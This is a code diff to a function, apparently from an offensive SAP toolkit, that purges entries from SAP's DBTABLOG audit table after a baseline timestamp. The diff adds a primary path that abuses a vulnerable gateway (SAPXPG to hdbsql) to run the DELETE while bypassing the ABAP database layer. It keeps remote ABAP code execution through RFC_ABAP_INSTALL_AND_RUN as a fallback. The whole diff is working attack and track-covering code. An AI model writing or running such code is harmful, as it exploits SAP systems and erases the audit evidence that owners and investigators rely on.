@@ -1318,9 +1318,12 @@ def tier3_dbtablog_purge(state, node, hold_seconds: float = 30.0,
     tabs = list(tabname_filter or [])
 
     from sap_dbtablog_purge import (read_baseline_timestamp,
-                                       purge_dbtablog)
+                                       purge_dbtablog,
+                                       purge_dbtablog_via_gw_hdbsql)
 
     # Step 1 — baseline (sy-datum + sy-uzeit on the SAP server).
+    # Captured via RFC regardless of DELETE channel: the SAP server
+    # clock is authoritative for LOGDATE/LOGTIME comparison.
     print(f"[*] {sid}: reading DBTABLOG baseline timestamp …")
     base = read_baseline_timestamp(node)
     if not base["ok"]:
@@ -1339,32 +1342,65 @@ def tier3_dbtablog_purge(state, node, hold_seconds: float = 30.0,
               f"actions in this window will be purged ({scope}) …")
         _time.sleep(max(0.0, float(hold_seconds)))
 
-    # Step 3 — purge.
+    # Step 3 — purge.  Delivery channel selection:
+    #   1. GW SAPXPG → hdbsql  (primary on HANA + GW-vulnerable nodes;
+    #      bypasses ABAP DBI entirely)
+    #   2. RFC_ABAP_INSTALL_AND_RUN  (fallback; works on any DB)
     where_txt = (f"LOGDATE/LOGTIME > {base_date} {base_time}")
-    if tabs:
-        print(f"[*] {sid}: purging DBTABLOG WHERE {where_txt} "
-              f"AND TABNAME IN {tabs} …")
-    else:
-        print(f"[*] {sid}: purging DBTABLOG WHERE {where_txt} "
-              f"(all tables) …")
-    purge = purge_dbtablog(node, base_date, base_time,
-                            tabname_filter=tabs)
+    is_hana = (getattr(node, "db_type", "") or "").upper() in ("HDB",
+                                                                  "HANA")
+    use_gw = is_hana and getattr(node, "gw_vulnerable", False)
+    purge = None
+    if use_gw:
+        if tabs:
+            print(f"[*] {sid}: GW SAPXPG → hdbsql DELETE "
+                  f"WHERE {where_txt} AND TABNAME IN {tabs} …")
+        else:
+            print(f"[*] {sid}: GW SAPXPG → hdbsql DELETE "
+                  f"WHERE {where_txt} (all tables) …")
+        purge = purge_dbtablog_via_gw_hdbsql(node, base_date, base_time,
+                                               tabname_filter=tabs)
+        if not purge["ok"]:
+            print(f"[!] {sid}: GW path failed "
+                  f"({purge.get('error', '?')}) — falling back to "
+                  f"RFC_ABAP_INSTALL_AND_RUN …")
+            purge = None
+
+    if purge is None:
+        if tabs:
+            print(f"[*] {sid}: RFC_ABAP_INSTALL_AND_RUN DELETE "
+                  f"WHERE {where_txt} AND TABNAME IN {tabs} …")
+        else:
+            print(f"[*] {sid}: RFC_ABAP_INSTALL_AND_RUN DELETE "
+                  f"WHERE {where_txt} (all tables) …")
+        purge = purge_dbtablog(node, base_date, base_time,
+                                tabname_filter=tabs)
+
     if not purge["ok"]:
         return _wrap_result(technique, False,
                              error=f"purge failed: "
                                     f"{purge.get('error', '?')}",
-                             base_date=base_date, base_time=base_time)
+                             base_date=base_date, base_time=base_time,
+                             via=purge.get("via", "?"))
 
     deleted = purge["deleted_count"]
-    print(f"[+] {sid}: DBTABLOG purged — {deleted} row(s) deleted, "
-          f"{purge['remaining_count']} remaining post-baseline")
+    via = purge.get("via", "?")
+    if deleted >= 0:
+        print(f"[+] {sid}: DBTABLOG purged via {via} — "
+              f"{deleted} row(s) deleted, "
+              f"{purge['remaining_count']} remaining post-baseline")
+    else:
+        print(f"[+] {sid}: DBTABLOG purged via {via} — "
+              f"row count not measured (GW SAPXPG path)")
 
     try:
         from sapmap_findings import emit_finding
         scope_txt = (f" (tables: {','.join(tabs)})" if tabs else "")
+        count_txt = (f"{deleted} entries deleted" if deleted >= 0
+                     else "DELETE executed (count not measured)")
         emit_finding(
             "INFO", sid,
-            f"Tier 3: DBTABLOG purged — {deleted} entries deleted "
+            f"Tier 3: DBTABLOG purged via {via} — {count_txt} "
             f"(> {base_date} {base_time}){scope_txt}")
     except Exception:
         pass
@@ -1376,4 +1412,5 @@ def tier3_dbtablog_purge(state, node, hold_seconds: float = 30.0,
         deleted_count=deleted,
         remaining_count=purge["remaining_count"],
         tabname_filter=tabs,
-        hold_seconds=hold_seconds)
+        hold_seconds=hold_seconds,
+        via=via)
